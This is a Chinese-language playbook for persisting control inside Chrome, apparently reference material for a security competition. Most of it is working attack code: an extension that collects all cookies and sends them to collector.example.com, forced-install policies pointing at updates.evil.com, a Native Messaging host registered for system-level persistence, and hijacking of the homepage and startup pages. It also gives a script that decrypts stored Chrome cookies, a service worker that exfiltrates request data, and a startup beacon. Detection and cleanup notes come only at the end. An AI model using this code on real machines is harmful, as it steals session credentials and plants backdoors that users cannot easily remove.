# 浏览器持久化：五种落地位置与"重启后仍在"的证明

> 被 `competition-browser-persistence` 引用。持久化的判据只有一条：**关闭浏览器、重启、
> 再打开，控制仍在**。其余都是"当前会话有效"，不算持久化。

## 一、五种持久化位置（按隐蔽性排序）

| # | 位置 | 存活范围 | 隐蔽性 | 需要什么 |
| --- | --- | --- | --- | --- |
| 1 | **扩展安装**（开发者模式/策略） | 永久 | 中（可在扩展列表看到） | 目录写权限 |
| 2 | **Native Messaging host** | 永久 | 高（外部程序，浏览器内不可见） | 注册表/文件写 |
| 3 | **书签/主页/搜索引擎劫持** | 永久 | 低（用户可见） | profile 写 |
| 4 | **profile 目录直接写入**（Preferences/Local Storage/Cookies） | 永久 | 高 | profile 写 |
| 5 | **service worker 常驻** | 会话内 + 缓存 | 高 | 扩展或站点上下文 |

## 二、扩展安装：三条路径

### 2.1 开发者模式加载（最直接）

```bash
# 准备一个最小扩展（读所有 cookie 并外发）
mkdir -p /tmp/ext && cd /tmp/ext
cat > manifest.json <<'EOF'
{
  "manifest_version": 3,
  "name": "Helper",
  "version": "1.0",
  "permissions": ["cookies", "storage"],
  "host_permissions": ["<all_urls>"],
  "background": { "service_worker": "bg.js" },
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["cs.js"],
    "run_at": "document_idle"
  }]
}
EOF
cat > bg.js <<'EOF'
chrome.runtime.onMessage.addListener((msg, sender, resp) => {
  if (msg.type === 'cookies') {
    chrome.cookies.getAll({}, (cs) => {
      fetch('https://collector.example.com/c', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ url: msg.url, cookies: cs })
      });
    });
  }
});
EOF
cat > cs.js <<'EOF'
chrome.runtime.sendMessage({ type: 'cookies', url: location.href });
EOF
```

```bash
# 用命令行加载（--load-extension 只对 --user-data-dir 生效，且会被部分版本忽略）
google-chrome --user-data-dir=/tmp/prof --load-extension=/tmp/ext \
  --disable-extensions-except=/tmp/ext about:blank

# 加载后确认
curl -s http://127.0.0.1:9222/json/list 2>/dev/null | grep -o 'chrome-extension://[a-p]*'
```

**注意**：Chrome 137+ 对 `--load-extension` 做了限制（仅企业策略/开发者模式 UI 可用）。实战
更多走"用户手动开启开发者模式 → 加载已解压扩展"，或用策略强制。

### 2.2 企业策略强制安装（用户无法移除）

```powershell
# Windows：写 forcelist（需要管理员）
$id = 'abcdefghijklmnopqrstuvwxyzabcdef'
$path = 'HKLM:\Software\Policies\Google\Chrome\ExtensionInstallForcelist'
New-Item -Path $path -Force | Out-Null
Set-ItemProperty -Path $path -Name '1' -Value "$id;https://updates.evil.com/update.xml"

# 需要同时允许非商店更新源
New-Item -Path 'HKLM:\Software\Policies\Google\Chrome' -Force | Out-Null
Set-ItemProperty -Path 'HKLM:\Software\Policies\Google\Chrome' `
  -Name 'ExtensionInstallSources' -Value @('https://updates.evil.com/*') -Type MultiString
```

```bash
# macOS：写 managed preferences
sudo defaults write /Library/Preferences/com.google.Chrome ExtensionInstallForcelist \
  -array "abcdefghijklmnopqrstuvwxyzabcdef;https://updates.evil.com/update.xml"
```

```bash
# Linux：策略文件
sudo mkdir -p /etc/opt/chrome/policies/managed
sudo tee /etc/opt/chrome/policies/managed/ext.json >/dev/null <<'EOF'
{
  "ExtensionInstallForcelist": ["abcdefghijklmnopqrstuvwxyzabcdef;https://updates.evil.com/update.xml"],
  "ExtensionInstallSources": ["https://updates.evil.com/*"]
}
EOF
```

**验证是否生效**：

```bash
# chrome://policy 里能看到，或直接读注册表
reg query "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /s
```

```bash
# 或看 Chrome 的 policy 日志
# Windows: %LOCALAPPDATA%\Google\Chrome\User Data\chrome_debug.log
grep -i 'policy\|forcelist' "$LOCALAPPDATA/Google/Chrome/User Data/chrome_debug.log" | tail -20
```

### 2.3 直接写入 profile 的 Extensions 目录

```bash
# 把扩展拷进 profile（Chrome 需要在启动时发现它）
PROFILE="$LOCALAPPDATA/Google/Chrome/User Data/Default"
mkdir -p "$PROFILE/Extensions/abcdefghijklmnopqrstuvwxyzabcdef/1.0.0_0"
cp -r /tmp/ext/* "$PROFILE/Extensions/abcdefghijklmnopqrstuvwxyzabcdef/1.0.0_0/"

# 还需要在 Preferences 里登记（否则不加载）
# 这是最关键一步，见 §5
```

## 三、Native Messaging host（最隐蔽）

扩展只能"在浏览器内"做事，native host 能"在系统上"做事。两者结合 = 完整持久化。

```bash
# 1) host manifest（放在用户可写位置）
mkdir -p "$LOCALAPPDATA/Google/Chrome/NativeMessagingHosts"
cat > "$LOCALAPPDATA/Google/Chrome/NativeMessagingHosts/com.helper.agent.json" <<EOF
{
  "name": "com.helper.agent",
  "description": "Helper Agent",
  "path": "$LOCALAPPDATA\\\\Helper\\\\agent.exe",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://abcdefghijklmnopqrstuvwxyzabcdef/"]
}
EOF
```

```powershell
# 2) 注册（HKCU 不需要管理员，这是最大的弱点）
New-Item -Path 'HKCU:\Software\Google\Chrome\NativeMessagingHosts\com.helper.agent' -Force | Out-Null
Set-ItemProperty -Path 'HKCU:\Software\Google\Chrome\NativeMessagingHosts\com.helper.agent' `
  -Name '(Default)' -Value "$env:LOCALAPPDATA\Google\Chrome\NativeMessagingHosts\com.helper.agent.json"
```

```javascript
// 3) 扩展里连接（stdio 协议：4 字节长度 + JSON）
const port = chrome.runtime.connectNative('com.helper.agent');
port.onMessage.addListener((m) => console.log('from host', m));
port.postMessage({ cmd: 'persist' });
```

**持久化的关键**：host 程序本身可以写 `Run` 注册表 / 计划任务 / crontab，这一步就完全脱离
浏览器了。这是"浏览器持久化"里最强的形态。

```powershell
# 验证 host 被拉起：看进程树
Get-CimInstance Win32_Process -Filter "Name='chrome.exe'" | ForEach-Object {
  Get-CimInstance Win32_Process -Filter "ParentProcessId=$($_.ProcessId)" |
    Select-Object ProcessId,Name,CommandLine
}
```

## 四、书签 / 主页 / 搜索引擎劫持

```bash
# 直接改 profile 的 Preferences（JSON）
python3 - <<'PY'
import json, os
p = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Preferences')
d = json.load(open(p, encoding='utf-8'))
d.setdefault('bookmark_bar', {}).setdefault('children', []).append({
    "date_added": "13300000000000000",
    "guid": "00000000-0000-0000-0000-000000000001",
    "id": "9999",
    "name": "Search",
    "type": "url",
    "url": "https://evil.example.com/"
})
d['homepage'] = 'https://evil.example.com/'
d['homepage_is_newtabpage'] = False
d['session'] = d.get('session', {})
d['session']['startup_urls'] = ['https://evil.example.com/']
json.dump(d, open(p,'w',encoding='utf-8'), ensure_ascii=False)
PY
```

**搜索引擎劫持**在 `Preferences` 的 `default_search_provider_data` 里：

```bash
python3 -c "
import json,os
p=os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Preferences')
d=json.load(open(p,encoding='utf-8'))
print(json.dumps(d.get('default_search_provider_data',{}),indent=2)[:1500])"
```

**写入前必须关闭浏览器**（Chrome 会在退出时覆盖 Preferences）。这是最常见的失败原因。

## 五、Profile 目录写入（最通用）

### 5.1 关键文件

| 文件 | 内容 | 可篡改性 |
| --- | --- | --- |
| `Preferences` | 设置、扩展注册、搜索引擎、主页 | JSON，可改（需关闭浏览器） |
| `Secure Preferences` | 带 HMAC 的 Preferences 副本 | **被 HMAC 保护**，改了会重置 |
| `Local State` | 全局设置、加密密钥（`os_crypt.encrypted_key`） | 可改，但影响 cookie 解密 |
| `Cookies` | SQLite，值被 DPAPI/AES-GCM 加密 | 见下 |
| `Login Data` | 保存的密码（SQLite，加密） | 同 Cookies |
| `History` | SQLite，明文 URL | 可读写 |
| `Local Storage/leveldb` | 站点 localStorage | 可读写（需浏览器关闭） |
| `Session Storage` | 会话级 | 重启即失 |
| `Service Worker/CacheStorage` | SW 脚本与缓存 | 可投毒 |

**`Secure Preferences` 是最大障碍**：Chrome 对 `Preferences` 里"受保护"的键（扩展、
搜索引擎、主页）计算 HMAC（密钥在 `Local State` 的 `protection.macs` 里，且被平台密钥
保护）。直接改 `Preferences` 会被检测为"损坏"并回滚。

```bash
# 看哪些键被保护
python3 -c "
import json,os
p=os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Secure Preferences')
d=json.load(open(p,encoding='utf-8'))
print('protection keys:', list(d.get('protection',{}).get('macs',{}).keys())[:20])"
```

**实战里的三条绕法**：

1. 改**不受保护**的键（如 `session.startup_urls`、部分 profile 内容）
2. 扩展通过 chrome API 改（走正常 API，不触发 HMAC）
3. 用企业策略（策略优先级高于 Preferences，且不需要 HMAC）

### 5.2 Cookie 的读写

```bash
# Cookies 是 SQLite，encrypted_value 加密
sqlite3 "$LOCALAPPDATA/Google/Chrome/User Data/Default/Cookies" \
  "select host_key,name,length(encrypted_value),expires_utc from cookies limit 10;"
```

```python
# Chrome 80+ 的 cookie 解密：v10 前缀 + AES-256-GCM，密钥来自 Local State 的 encrypted_key
# encrypted_key 本身被 DPAPI 保护（Windows）
import json, base64, sqlite3, os, win32crypt
from Crypto.Cipher import AES

local_state = json.load(open(os.path.expandvars(
    r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State'), encoding='utf-8'))
enc_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]  # 去 'DPAPI'
key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]

con = sqlite3.connect(os.path.expandvars(
    r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies'))
for host, name, val in con.execute("select host_key,name,encrypted_value from cookies limit 5"):
    if val[:3] == b'v10':
        nonce, ct = val[3:15], val[15:]
        pt = AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt(ct)[:-16]
    else:
        pt = win32crypt.CryptUnprotectData(val, None, None, None, 0)[1]
    print(host, name, pt[:60])
```

**注意**：这是**读取**已有 cookie。**写入**伪造 cookie 需要能算出 HMAC（Chrome 会校验
cookie 的完整性），实际不可行。所以 cookie 劫持的正确方向是**读取并重放到服务端**，不是伪造。

### 5.3 Service Worker 常驻

```bash
# 站点 SW 的脚本缓存在 profile 里
ls "$LOCALAPPDATA/Google/Chrome/User Data/Default/Service Worker/CacheStorage/"
ls "$LOCALAPPDATA/Google/Chrome/User Data/Default/Service Worker/ScriptCache/"
```

SW 的持久化能力：注册后即使标签页关闭，SW 仍可在后台处理 `push`、`fetch` 事件。
这是**网页侧**的持久化路径（无需扩展）。

```javascript
// 站点侧：注册一个常驻 SW，拦截所有请求
navigator.serviceWorker.register('/sw.js', { scope: '/' });
// sw.js:
self.addEventListener('fetch', (e) => {
  // 改响应、注入脚本、外发数据
  e.respondWith(fetch(e.request).then(async (r) => {
    fetch('https://collector.example.com/log', {method:'POST', body: e.request.url});
    return r;
  }));
});
```

**限制**：SW 只能控制同源 scope，且用户清缓存即失效。隐蔽性不如扩展。

## 六、验伤：怎么证明"重启后仍在"

这是本文件的核心。**必须做的四步**：

```bash
# 步骤 1：确认当前控制有效
# 例：扩展能读到 cookie 并外发 → 在 collector 上看到数据

# 步骤 2：完全退出浏览器（不是关窗口）
#    Windows: 确认进程全部退出
tasklist | findstr /i chrome.exe     # 必须为空
#    macOS: pkill -f "Google Chrome"
#    Linux: pkill -f chrome

# 步骤 3：重启浏览器（正常启动，不带任何特殊参数）
google-chrome    # 或双击图标

# 步骤 4：再次触发并确认控制仍在
#    例：打开任意站点，collector 上重新收到数据
```

**判据表**：

| 位置 | 重启后仍生效的标志 | 假象 |
| --- | --- | --- |
| 扩展（开发者模式） | 扩展列表里仍在，且功能正常 | 重启后变灰"已停用"（Chrome 会禁用非商店扩展） |
| 扩展（策略强制） | `chrome://policy` 里仍显示，用户无法移除 | 只在当前会话有效（策略未落盘） |
| Native host | 重启后扩展能再次连上，且系统侧持久化（计划任务/Run）仍在 | host 只在扩展点击时启动（重启后未触发） |
| 书签/主页 | 新标签页直接跳到目标；书签栏有该项 | 只在重启前有效（Preferences 被覆盖） |
| Profile 写入 | 重启后配置仍是新值 | 重启后被 `Secure Preferences` HMAC 校验回滚 |
| Service worker | 重启后 SW 仍有 `activated` 状态并能拦截请求 | SW 被浏览器回收（一段时间不用就停） |

```javascript
// 扩展侧的"存活证明"：写一个带启动时间戳的标记
// bg.js
chrome.runtime.onStartup.addListener(async () => {
  const { installId } = await chrome.storage.local.get('installId');
  fetch('https://collector.example.com/alive', {
    method: 'POST',
    body: JSON.stringify({ installId, ts: Date.now(), event: 'onStartup' })
  });
});
// 重启后 collector 收到 onStartup → 证明扩展被持久加载
```

`chrome.runtime.onStartup` 是**最硬的证据**：它只在浏览器启动时触发，且只有被真正加载的
扩展才会收到。

## 七、检测视角

| 手法 | 日志/信号 | 特征 |
| --- | --- | --- |
| 开发者模式扩展 | 浏览器管理台 | `chrome://extensions` 出现"已解压的扩展程序"；非商店 ID |
| 策略强制安装 | chrome://policy / 注册表监控 | `ExtensionInstallForcelist` 被写；`ExtensionInstallSources` 放行非商店域 |
| Native host 注册 | 注册表监控（HKLM/HKCU） | `NativeMessagingHosts` 新增项；`path` 指向用户可写目录 |
| host 进程 | 进程创建（4688/Sysmon 1） | `chrome.exe` → 未签名 exe；父进程是浏览器 |
| 书签/主页变更 | 文件完整性监控 | `Preferences` 的 `homepage`/`startup_urls` 偏离基线 |
| Profile 篡改 | 文件监控 | `Preferences` 写入时浏览器未运行；`Secure Preferences` 与 `Preferences` 不一致 |
| Cookie 读取 | EDR | 非浏览器进程打开 `Cookies` SQLite；调用 `CryptUnprotectData` |
| SW 投毒 | 站点 CSP/完整性 | `Service Worker` 脚本 hash 变化；SW 注册 scope 异常 |

**最有效的组合检测**：`浏览器进程拉起非签名子进程` + `HKCU NativeMessagingHosts 新增`，
两条同时出现基本可确认。

## 八、常见坑

1. **浏览器没完全退出就改 Preferences**——Chrome 退出时会用内存状态覆盖磁盘。必须先
   `tasklist` 确认为空。
2. **忽略 `Secure Preferences` 的 HMAC**——改 `Preferences` 里的扩展/搜索引擎/主页会被
   回滚。要么改不受保护的键，要么走策略，要么走 chrome API。
3. **开发者模式扩展在重启后被禁用**——新版 Chrome 对非商店源扩展有额外限制。用策略或
   `--enable-features` 相关开关绕过（视版本）。
4. **`--load-extension` 不生效**——Chrome 137+ 限制该参数。改用 `--user-data-dir` + 手动
   加载，或走策略。
5. **Native host 的 `path` 写了相对路径**——必须是绝对路径，否则 host 起不来（且浏览器
   不报错，只在 host 侧静默失败）。
6. **验证只做了"文件还在"**——文件在 ≠ 加载了。必须用 `onStartup` 或实际功能触发来证明。
7. **Cookie 伪造方向错了**——Chrome 校验 cookie 完整性，写入伪造值无效。正确方向是读取后
   重放到服务端。
8. **测试后没清理**——扩展、注册表项、计划任务都要移除，否则是留后门（合规问题）。